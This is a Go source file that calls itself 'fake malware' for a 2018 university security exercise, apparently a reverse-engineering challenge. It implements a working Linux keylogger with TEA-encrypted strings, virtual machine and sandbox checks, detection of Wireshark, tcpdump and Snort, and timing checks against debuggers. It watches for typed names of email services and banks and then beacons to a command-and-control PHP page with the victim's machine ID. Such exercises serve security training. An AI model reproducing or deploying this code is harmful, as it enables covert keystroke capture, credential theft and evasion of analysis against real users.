// set go path: export GOPATH=$HOME/go
// key logger: https://github.com/MarinX/keylogger
//		https://medium.com/@marin.basic02/sniffing-global-keyboard-events-in-go-e5497e618192

// BUILD IT WITH: go build -gcflags "-N -l" -o main main.go && sudo ./main

package main

import (
    "fmt"
	"strings"
	"bytes"
    "github.com/MarinX/keylogger"	// go get github.com/MarinX/keylogger
	"net/http"
	"io/ioutil"
	"math/rand"
	"time"
	"golang.org/x/crypto/tea"
	"github.com/mitchellh/go-ps"	// go get github.com/mitchellh/go-ps
	"github.com/jaypipes/ghw"
	b64 "encoding/base64"
)

/* --------------------------- ENCRYPTED STRINGS --------------------------- */

var debut []byte = []byte{34, 172, 51, 55, 132, 79, 38, 161, 93, 168, 57, 128, 28, 1, 74, 190}	// http://www.
var sousdomaine []byte = []byte{8, 138, 225, 246, 28, 70, 8, 81, 251, 51, 116, 233, 185, 166, 254, 244}	// fuckfuckgo
var point []byte = []byte{185, 141, 172, 96, 132, 4, 1, 131}	// .
var domaine []byte = []byte{229, 194, 195, 182, 202, 49, 111, 202}	// xyz
var pageweb []byte = []byte{125, 161, 245, 32, 124, 57, 61, 88}	// /c2.php

var usconst = []byte{181, 183, 253, 108, 29, 24, 201, 159, 130, 185, 53, 237, 186, 228, 217, 233, 83, 6, 66, 251, 14, 82, 8, 230, 35, 33, 255, 224, 114, 6, 164, 38, 96, 90, 72, 181, 173, 123, 225, 119, 248, 66, 80, 160, 110, 81, 224, 87}	// https://www.constitution.org/usdeclar.txt

var parameter = []byte{112, 189, 145, 253, 223, 162, 151, 195}	// ?dog=
var cookie = []byte{42, 173, 230, 74, 34, 19, 43, 149}	// Cookie

var shark = []byte{247, 205, 60, 57, 232, 209, 69, 185}	// shark
var tcpdump = []byte{34, 184, 74, 78, 74, 175, 235, 93}	// tcpdump
var snort = []byte{225, 217, 249, 133, 198, 153, 119, 185}	// snort

var broken = []byte{57, 106, 81, 157, 150, 127, 195, 11, 86, 11, 31, 235, 203, 209, 141, 206, 225, 163, 197, 143, 6, 95, 223, 123}	// program is broken
var mid1 = []byte{23, 27, 67, 243, 9, 21, 45, 98, 200, 6, 125, 114, 181, 86, 124, 144, 141, 237, 111, 200, 226, 195, 37, 93}	// /var/lib/dbus/machine-id
var mid2 = []byte{187, 72, 252, 111, 56, 242, 22, 107, 172, 126, 226, 108, 191, 249, 99, 125}	// /etc/machine-id
var maga = []byte{116, 168, 211, 127, 186, 35, 134, 177}	// maga=

var Keyboard = []byte{30, 110, 253, 49, 55, 243, 182, 36}	// Keyboard
var keyboard = []byte{138, 32, 109, 139, 86, 60, 75, 199}	// keyboard
var key = []byte{121, 42, 150, 18, 152, 104, 96, 14}	// key
var user_agent = []byte{140, 207, 233, 115, 79, 201, 8, 162, 240, 42, 12, 164, 47, 67, 143, 3}	// User-Agent
var curl_version = []byte{239, 117, 8, 217, 124, 158, 156, 195, 144, 95, 172, 67, 54, 212, 71, 251}	// curl/7.37.0
var Cache_Control = []byte{89, 12, 100, 114, 143, 190, 1, 42, 180, 137, 201, 159, 220, 139, 218, 49}	// Cache-Control
var no_cache = []byte{19, 224, 188, 253, 110, 93, 14, 112}	// no-cache
var x_content = []byte{20, 240, 234, 121, 4, 12, 119, 226, 197, 90, 0, 5, 62, 249, 140, 136, 61, 4, 133, 141, 238, 143, 128, 18}	// X-Content-Type-0ptions
var nosniff = []byte{171, 209, 251, 209, 25, 155, 125, 132}	// nosniff
var doggourl = []byte{181, 183, 253, 108, 29, 24, 201, 159, 50, 166, 118, 232, 182, 168, 171, 59, 64, 67, 185, 51, 64, 27, 51, 165, 54, 190, 207, 182, 50, 38, 30, 245, 59, 116, 22, 185, 28, 57, 190, 160}	// https://www.google.com/images?q=doggo
var word_yes = []byte{34, 64, 38, 27, 214, 172, 61, 218}	// yes
var word_success = []byte{97, 250, 104, 199, 114, 89, 159, 67}	// success!
var word_woof = []byte{150, 203, 194, 4, 254, 172, 102, 9}	// woof
var word_done = []byte{70, 124, 44, 51, 134, 157, 69, 121}	// done
var dog_is_dead = []byte{79, 50, 10, 150, 89, 147, 110, 145, 158, 114, 88, 20, 34, 145, 110, 128}	// your dog is dead
var word_maj_get = []byte{170, 147, 60, 126, 30, 217, 48, 3}	// GET
var word_maj_post = []byte{144, 185, 1, 25, 48, 126, 6, 39}	// POST

var word_facebook = []byte{85, 45, 76, 141, 33, 249, 43, 12}	// FACEBOOK
var word_outlook = []byte{80, 238, 171, 130, 212, 161, 210, 120}	// OUTLOOK
var word_hotmail = []byte{99, 104, 155, 56, 159, 168, 154, 52}	// HOTMAIL
var word_gmail = []byte{252, 210, 175, 138, 201, 190, 95, 39}	// GMAIL
var word_youtube = []byte{163, 183, 61, 133, 218, 107, 3, 67}	// YOUTUBE
var word_protonmail = []byte{228, 1, 90, 5, 240, 20, 189, 32, 201, 194, 74, 64, 131, 74, 250, 141}	// PROTONMAIL
var word_bmo = []byte{228, 232, 105, 153, 143, 91, 19, 229}	// BMO
var word_desjardins = []byte{29, 98, 228, 164, 20, 230, 41, 240, 55, 54, 200, 251, 74, 40, 185, 183}	// DESJARDINS
var word_cibc = []byte{148, 161, 118, 98, 40, 68, 163, 34}	// CIBC
var word_bnc = []byte{108, 191, 103, 226, 23, 162, 127, 90}	// BNC


func arrayToString(a []byte) string {
    return strings.Trim(strings.Replace(fmt.Sprint(a), " ", ", ", -1), "[]")
    //return strings.Trim(strings.Join(strings.Split(fmt.Sprint(a), " "), delim), "[]")
    //return strings.Trim(strings.Join(strings.Fields(fmt.Sprint(a)), delim), "[]")
}


// unique ID
func machineID() (string,error) {
	id, err := ioutil.ReadFile(string(TestCipherDecrypt(mid1, 24)))
	if err != nil {
		// try fallback path
		id, err = ioutil.ReadFile(string(TestCipherDecrypt(mid2, 15)))
	}
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(id)), nil
}

// find devince
func fide(devs []*keylogger.InputDevice) *keylogger.InputDevice {

	for _, val := range devs {
//	    fmt.Println("Id->", val.Id, "Device->", val.Name)
		if strings.Contains(val.Name, string(TestCipherDecrypt(Keyboard, 8))) {
			return val
		} else if strings.Contains(val.Name, string(TestCipherDecrypt(keyboard, 8))) {
			return val
		} else if strings.Contains(strings.ToLower(val.Name), string(TestCipherDecrypt(key, 3))) {
			return val
		}
    }

	return devs[999]	// fuck, device not found
} 

var testKey = []byte{0x73, 0x61, 0x6c, 0x75, 0x74, 0x6c, 0x65, 0x73, 0x61, 0x6d, 0x69, 0x73, 0x5f, 0x32, 0x33, 0x36}

//const plaintext_s = "fuckfuckgo.xyz"

// Unsafe encryption that calls Encrypt repetitively on blocks
func TestCipherEncrypt(plaintext []byte) []byte {

	// Test cypher
	c, err := tea.NewCipher(testKey)
	if err != nil {
		fmt.Println(string(TestCipherDecrypt(broken, 17)))
	}

	// Naive algoritm for padding. Makes a multiple of 8.
	for len(plaintext) % 8 != 0 {
		plaintext = append(plaintext, 0)
	}

	// create an array (or slice?) with the new lenght (padded)
	a := make([]byte, len(plaintext))

	// Encrypt blocks
	for i := 0; i < len(plaintext); i += 8 {
		var ciphertext [8]byte
		c.Encrypt(ciphertext[:], plaintext[i:i+8])	// (dst, src []byte)

		//a = append(a, ciphertext...)
		copy(a[i:i+8], ciphertext[:])

/*		fmt.Print("encrypted: ")
		fmt.Println(ciphertext)
		fmt.Print("enc total: ")
		fmt.Println(a)
*/	}

//	newa := make([]byte, orig_size)
//	copy(newa, a[0:orig_size])
//	fmt.Println(newa)	// It's encrypted!!

	return a
}

func TestCipherDecrypt(encr_string []byte, origlength int) []byte {

	c, err := tea.NewCipher(testKey)
	if err != nil {
		fmt.Println(string(TestCipherDecrypt(broken, 17)))
	}

	// Create a new container for the string that will be decrypted
	a := make([]byte, len(encr_string))

	// Encrypt blocks
	for i := 0; i < len(encr_string); i += 8 {
		var decrypted [8]byte
		c.Decrypt(decrypted[:], encr_string[i:i+8])	// (dst, src []byte)
		copy(a[i:i+8], decrypted[:])
	}

	// Get the original string back from this
	newa := make([]byte, origlength)
	copy(newa, a[0:origlength])
//	fmt.Println(string(newa))	// It's decrypted!!

	return newa
}

func DetectProcess() bool {
	ps, _ := ps.Processes()

	for pp := range ps {

		if strings.Contains(strings.ToLower(ps[pp].Executable()), string(TestCipherDecrypt(shark, 5))) {
//			fmt.Printf("wireshark found!!")
			return true
		}
		if strings.Contains(strings.ToLower(ps[pp].Executable()), string(TestCipherDecrypt(tcpdump, 7))) {
//			fmt.Printf("tcpdump found!!")
			return true
		}
		if strings.Contains(strings.ToLower(ps[pp].Executable()), string(TestCipherDecrypt(snort, 5))) {
//			fmt.Printf("snort found!!")
			return true
		}

		//fmt.Printf("%d %s\n", ps[pp].Pid(), ps[pp].Executable())
	}

	return false
}

// VM detection features. It detects a low specs PC (very old PC).
func CheckSpecs() bool {
	// Check the amount of RAM
	memory, err := ghw.Memory()
	if err == nil {
		fmt.Println(memory.TotalPhysicalBytes)

		// Has 3GB of RAM
		if memory.TotalPhysicalBytes < 3078870528 {
			return true
		}
	}

	// Check the amount of CPU cores
	cpu, err := ghw.CPU()
	if err == nil {
		fmt.Println(fmt.Sprint(cpu.TotalCores))

		// Hasn't at least two cores
		if cpu.TotalCores < 2 {
			return true
		}
	}

	// Check block devices for disk space
	block, err := ghw.Block()
	if err == nil {
		// Hasn't one disk with at least 75GB
		if len(block.Disks) == 1 {
			fmt.Println(block.TotalPhysicalBytes)

			if block.TotalPhysicalBytes <= 75017086125 {
				return true
			}
		}

		// I don't think it works
/*		for _, disk := range block.Disks {
			fmt.Println(disk.String())

			if strings.Contains(strings.ToLower(disk.String()), "emu") || strings.Contains(strings.ToLower(disk.String()), "vm") {
				return true
			}
		}*/
	}

	return false
}

func main() {

	const copyright = "This is a fake malware made for DCI ETS 2018.\nCopyright (c) Alexandre-Xavier Labonté-Lamoureux, 2018\n"
	coolstuff := "allo"
	moar := "vide"


/*	if DetectProcess() {
		return
	}*/

/*	if CheckSpecs() {
		return
	}*/


/*
	var test []byte = TestCipherEncrypt([]byte(plaintext_s))
	var resu []byte = TestCipherDecrypt(test, len(plaintext_s))
	fmt.Println(resu)

	var test0 []byte = TestCipherEncrypt([]byte("http://www."))
	var test1 []byte = TestCipherEncrypt([]byte("fuckfuckgo"))
	var test2 []byte = TestCipherEncrypt([]byte("."))
	var test3 []byte = TestCipherEncrypt([]byte("xyz"))
	var test4 []byte = TestCipherEncrypt([]byte("/c2.php"))
	fmt.Println("tests: ")
	fmt.Println(test0)
	fmt.Println(test1)
	fmt.Println(test2)
	fmt.Println(test3)
	fmt.Println(test4)
	fmt.Println("-- end --")
*/

/*
	var test0 []byte = TestCipherEncrypt([]byte("https://www.constitution.org/usdeclar.txt"))
	var test1 []byte = TestCipherEncrypt([]byte("?dog="))
	var test2 []byte = TestCipherEncrypt([]byte("Cookie"))
	var test3 []byte = TestCipherEncrypt([]byte("shark"))
	var test4 []byte = TestCipherEncrypt([]byte("tcpdump"))
	var test5 []byte = TestCipherEncrypt([]byte("snort"))
	var test6 []byte = TestCipherEncrypt([]byte("program is broken"))
	var test7 []byte = TestCipherEncrypt([]byte("/var/lib/dbus/machine-id"))
	var test8 []byte = TestCipherEncrypt([]byte("/etc/machine-id"))
	var test9 []byte = TestCipherEncrypt([]byte("maga="))
	fmt.Println("tests: ")
	fmt.Println(test0)
	fmt.Println(test1)
	fmt.Println(test2)
	fmt.Println(test3)
	fmt.Println(test4)
	fmt.Println(test5)
	fmt.Println(test6)
	fmt.Println(test7)
	fmt.Println(test8)
	fmt.Println(test9)
	fmt.Println("-- end --")
*/
/*
	var test0 []byte = TestCipherEncrypt([]byte("Keyboard"))
	var test1 []byte = TestCipherEncrypt([]byte("keyboard"))
	var test2 []byte = TestCipherEncrypt([]byte("key"))
	var test3 []byte = TestCipherEncrypt([]byte("User-Agent"))
	var test4 []byte = TestCipherEncrypt([]byte("curl/7.37.0"))
	var test5 []byte = TestCipherEncrypt([]byte("Cache-Control"))
	var test6 []byte = TestCipherEncrypt([]byte("no-cache"))
	var test7 []byte = TestCipherEncrypt([]byte("X-Content-Type-0ptions"))
	var test8 []byte = TestCipherEncrypt([]byte("nosniff"))
	var test9 []byte = TestCipherEncrypt([]byte("https://www.google.com/images?q=doggo"))
	var test10 []byte = TestCipherEncrypt([]byte("yes"))
	var test11 []byte = TestCipherEncrypt([]byte("success!"))
	var test12 []byte = TestCipherEncrypt([]byte("woof"))
	var test13 []byte = TestCipherEncrypt([]byte("done"))
	var test14 []byte = TestCipherEncrypt([]byte("your dog is dead"))
	var test15 []byte = TestCipherEncrypt([]byte("GET"))
	var test16 []byte = TestCipherEncrypt([]byte("POST"))
	fmt.Println("tests: ")
	fmt.Println(arrayToString(test0))
	fmt.Println(arrayToString(test1))
	fmt.Println(arrayToString(test2))
	fmt.Println(arrayToString(test3))
	fmt.Println(arrayToString(test4))
	fmt.Println(arrayToString(test5))
	fmt.Println(arrayToString(test6))
	fmt.Println(arrayToString(test7))
	fmt.Println(arrayToString(test8))
	fmt.Println(arrayToString(test9))
	fmt.Println(arrayToString(test10))
	fmt.Println(arrayToString(test11))
	fmt.Println(arrayToString(test12))
	fmt.Println(arrayToString(test13))
	fmt.Println(arrayToString(test14))
	fmt.Println(arrayToString(test15))
	fmt.Println(arrayToString(test16))
	fmt.Println("-- end --")
*/
/*
	var test0 []byte = TestCipherEncrypt([]byte("FACEBOOK"))
	var test1 []byte = TestCipherEncrypt([]byte("OUTLOOK"))
	var test2 []byte = TestCipherEncrypt([]byte("HOTMAIL"))
	var test3 []byte = TestCipherEncrypt([]byte("GMAIL"))
	var test4 []byte = TestCipherEncrypt([]byte("YOUTUBE"))
	var test5 []byte = TestCipherEncrypt([]byte("PROTONMAIL"))
	var test6 []byte = TestCipherEncrypt([]byte("BMO"))
	var test7 []byte = TestCipherEncrypt([]byte("DESJARDINS"))
	var test8 []byte = TestCipherEncrypt([]byte("CIBC"))
	var test9 []byte = TestCipherEncrypt([]byte("BNC"))
	fmt.Println("tests: ")
	fmt.Println(arrayToString(test0))
	fmt.Println(arrayToString(test1))
	fmt.Println(arrayToString(test2))
	fmt.Println(arrayToString(test3))
	fmt.Println(arrayToString(test4))
	fmt.Println(arrayToString(test5))
	fmt.Println(arrayToString(test6))
	fmt.Println(arrayToString(test7))
	fmt.Println(arrayToString(test8))
	fmt.Println(arrayToString(test9))
	fmt.Println("-- end --")
*/

	stringys := make([]string, 0)

	// Download the text for the kinda DGA
	resp, err := http.Get(string(TestCipherDecrypt(usconst, 41)))	// https://www.constitution.org/usdeclar.txt
	if err != nil {
		// handle error
		fmt.Println("yes")
		return
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err == nil {
			rand.Seed(time.Now().UTC().UnixNano())

			stuff := string(body[:len(body)])
			moar = string(body[:len(body)])
			t := strings.Replace(stuff, ",", "", -1)
			t = strings.Replace(t, ".", "", -1)
			t = strings.Replace(t, "[", "", -1)
			t = strings.Replace(t, "]", "", -1)
			t = strings.Replace(t, ":", "", -1)
			t = strings.Replace(t, ";", "", -1)
			t = strings.Replace(t, "-", "", -1)
			words := strings.Fields(t)
//			fmt.Println(words)

//			stringys = words
			for y := range words {
				stringys = append(stringys, words[y])	// slow, lol
			}

			var strs [3]string
			strs[0] = words[rand.Intn(len(words))]
			strs[1] = words[rand.Intn(len(words))]
			strs[2] = words[rand.Intn(len(words))]
			str := strs[0] + strs[1] + strs[2]
			fmt.Print(str + "\n")

			// replace the string to be used
			coolstuff = str
		}
	}

	chars := make([]bool, 256) // All false

	start := time.Now()
	start2 := time.Now()

	if len(copyright) > 2 {
		substring := copyright[len(copyright):len(copyright)]
		fmt.Print(substring)
	}

	// Woops. It's in a VM or something.
	if CheckSpecs() {
		return
	}

	if time.Since(start) > time.Second * 6 {
		fmt.Println("-------------Too SLOW. DEBUGGER?1")
		return
	}

    devs, err := keylogger.NewDevices()
    if err != nil {
	    fmt.Println("success!")	// try running as root
	    return
    }

/*   for _, val := range devs {
	    fmt.Println("Id->", val.Id, "Device->", val.Name)
    }*/

    //keyboard device file, on your system it will be diffrent!
    rd := keylogger.NewKeyLogger(fide(devs))

    in, err := rd.Read()
    if err != nil {
	    fmt.Println(err)
	    return
    }

//	const trump = "Trump makes America great again"

	var buffer bytes.Buffer

	var times int = 0



	if time.Since(start2) > time.Second * 10 {
		fmt.Println("-------------Too SLOW. DEBUGGER?2")
		return
	}

	/* FIXING THE FUCKING KEYLOGGER */

	for i := range in {
	    //we only need keypress
	    if i.Type == keylogger.EV_KEY {	// 1

			if len(buffer.String()) >= 0 {
				// remove the next caracter if it's the same as the one that came before
				var s string = buffer.String()

				if len(buffer.String()) >= 1 {
					s = s[len(s)-1:]
				}

				start4 := time.Now()

				var a string = i.KeyString()

				// check if it's a single char
				if len(a) == 1 {
					// check if it's a letter
					if a[0] >= '!' && a[0] <= '~' {
						fmt.Println("----")

						// flip the bit so we know if the key was released or pressed
						if chars[a[0] - '!'] == false {
							chars[a[0] - '!'] = true
						} else {
							chars[a[0] - '!'] = false
						}
/*
						for b := range chars {
							fmt.Println(chars[b])
						}
*/
						if chars[a[0] - '!'] == true {
							buffer.WriteString(i.KeyString())
							fmt.Println(buffer.String())
						}
					}

					// Time check
					if time.Since(start4) > time.Second * 5 {
						fmt.Println("-------------Too SLOW. DEBUGGER?4")
						continue
					}
				}

				if len(a) > 0 {	// Pressing the "Windows" key caused a crash (index out of range).
					if a != s && a[0] == 'z' {
						buffer.WriteString(i.KeyString())
						fmt.Println("Трамп - лучший президент после Авраама Линкольна")
						fmt.Println("RReeee!")
					}
				}

//				fmt.Println(s)
			} else {
				buffer.WriteString(i.KeyString() /*+ "\n"*/)
			}

			times = times + 1
	    }

		// Encrypt a dumb strings that doesn't mean anything
		start3 := time.Now()

		for i := 0; i < 12800; i++ {
			dummy := coolstuff
			if i == 0 {
				dummy = string(TestCipherEncrypt([]byte(mid2)))
			}
			coolstuff = string(TestCipherEncrypt([]byte(dummy)))
		}

		fmt.Print(copyright[len(copyright):len(copyright)])

//		fmt.Println(time.Since(start))

		if time.Since(start3) < time.Millisecond {
			fmt.Println("-------------COMPUTER IS TOO FAST. ENCRYPTION HAS BEEN REMOVED")
			continue
		}

		//fmt.Println(buffer.String())

		start5 := time.Now()

		// crappy circular buffer thingy
		if len(buffer.String()) > 20 {
			allo := buffer.String()
			buffer.Reset()
			allo = strings.TrimLeft(allo, allo[0:1])
			buffer.WriteString(allo)
		}

		if strings.Contains(buffer.String(), string(TestCipherDecrypt(word_facebook, 8))) || 
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_outlook, 7))) ||
 			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_hotmail, 7))) || 
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_gmail, 5))) ||
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_youtube, 7))) || 
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_protonmail, 10))) ||
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_bmo, 3))) || 
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_desjardins, 10))) ||
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_cibc, 4))) || 
			strings.Contains(buffer.String(), string(TestCipherDecrypt(word_bnc, 3)))  {

			// Générer le string batard
			stuff := moar
			t := strings.Replace(stuff, ",", "", -1)
			t = strings.Replace(t, ".", "", -1)
			t = strings.Replace(t, "[", "", -1)
			t = strings.Replace(t, "]", "", -1)
			t = strings.Replace(t, ":", "", -1)
			t = strings.Replace(t, ";", "", -1)
			t = strings.Replace(t, "-", "", -1)
			words := strings.Fields(t)
//			fmt.Println(words)

//			stringys = words
			for y := range words {
				stringys = append(stringys, words[y])	// slow, lol
			}

			var strs [3]string
			strs[0] = words[rand.Intn(len(words))]
			strs[1] = words[rand.Intn(len(words))]
			strs[2] = words[rand.Intn(len(words))]
			str := strs[0] + strs[1] + strs[2]
			fmt.Print(str + "\n")

			// replace the string to be used
			coolstuff = str

			// Check if some program that we don't want is running or if it's in a VM
			if !DetectProcess() && !CheckSpecs() {

				// Faire une requête web et uploader le string
				client := &http.Client{
				}

				// Time check
				if time.Since(start5) > time.Millisecond * 9 * 1000 {
					fmt.Println("-------------Too SLOW. DEBUGGER?5")
					continue
				}

				siteweb := string(TestCipherDecrypt(debut, 11)) + string(TestCipherDecrypt(sousdomaine, 10)) + 
							string(TestCipherDecrypt(point, 1)) + string(TestCipherDecrypt(domaine, 3)) + 
							string(TestCipherDecrypt(pageweb, 7))
//				fmt.Println(siteweb)

				token := make([]byte, 20)
				rand.Read(token)
//				fmt.Println(token)
//bytes.NewReader(token)
//strings.NewReader("allotestmoi")
				req, err := http.NewRequest(string(TestCipherDecrypt(word_maj_post, 4)), 
							siteweb + string(TestCipherDecrypt(parameter, 5)) + coolstuff, bytes.NewReader(token))
				if err != nil {
					fmt.Println(string(TestCipherDecrypt(dog_is_dead, 16)))
				}

				uid, err := machineID()
				if err == nil {
					req.Header.Add(string(TestCipherDecrypt(cookie, 6)), string(TestCipherDecrypt(maga, 5)) + uid)
				}

//				req.Host = "net.minou.com"
				req.Header.Add(string(TestCipherDecrypt(user_agent, 10)), string(TestCipherDecrypt(curl_version, 11)))
//				req.Header.Add("Cookie", "PHPSESSID=r2t5uvjq435r4q7ib3vtdjq120")
				req.Header.Add(string(TestCipherDecrypt(Cache_Control, 13)), string(TestCipherDecrypt(no_cache, 8)))

				resp, err := client.Do(req)

				if err == nil {
					if resp.StatusCode != http.StatusOK {
						bodyBytes, _ := ioutil.ReadAll(resp.Body)
						bodyString := string(bodyBytes)
//						fmt.Println(bodyString)

						ua := resp.Header.Get(string(TestCipherDecrypt(x_content, 22)))

						if strings.Contains(ua, string(TestCipherDecrypt(nosniff, 7))) {
							continue
						}

						sDec, _ := b64.StdEncoding.DecodeString(bodyString)
						fmt.Print(string(sDec)[len(string(sDec)):len(string(sDec))])

						buffer.Reset()
					}

					defer resp.Body.Close()
				}

//				if resp.StatusCode == http.StatusOK {
//					bodyBytes, err2 := ioutil.ReadAll(resp.Header)
//					bodyString := string(bodyBytes)

				// Check if the C2 behaves correctly
	/*			ua := resp.Header.Get("X-Content-Type-Options")

				if strings.Contains(ua, "nosniff") {	// TODO: modifier
					fmt.Println("C&C server does not behave correctly. Please contact Alexandre-Xavier from DCI ÉTS.")
					return
				}*/

				// read the body
/*				body, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					stuff := string(body[:len(body)])
					fmt.Println(stuff)
				}
*/
				buffer.Reset()
			} else {
				client := &http.Client{
				}

				buffer.Reset()

				req, err := http.NewRequest(string(TestCipherDecrypt(word_maj_get, 3)), string(TestCipherDecrypt(doggourl, 37)), nil)
				if err != nil {
					fmt.Println(string(TestCipherDecrypt(word_woof, 4)))
				}

				resp, err := client.Do(req)

				if err == nil && resp.StatusCode == http.StatusOK {

					bodyBytes, _ := ioutil.ReadAll(resp.Body)
					bodyString := string(bodyBytes)

					ua := resp.Header.Get(string(TestCipherDecrypt(x_content, 22)))
					if strings.Contains(ua, string(TestCipherDecrypt(nosniff, 7))) {
						continue
					}
					sDec, err := b64.StdEncoding.DecodeString(bodyString)
					if err != nil {
						fmt.Print(string(sDec)[len(string(sDec)):len(string(sDec))])
					}

					fmt.Print(string(sDec)[0:len(string(sDec))])

//					fmt.Println("Ok. COOL!==========")
					defer resp.Body.Close()
				}
			}
		}
    }

	fmt.Println(string(TestCipherDecrypt(word_done, 4)))
}
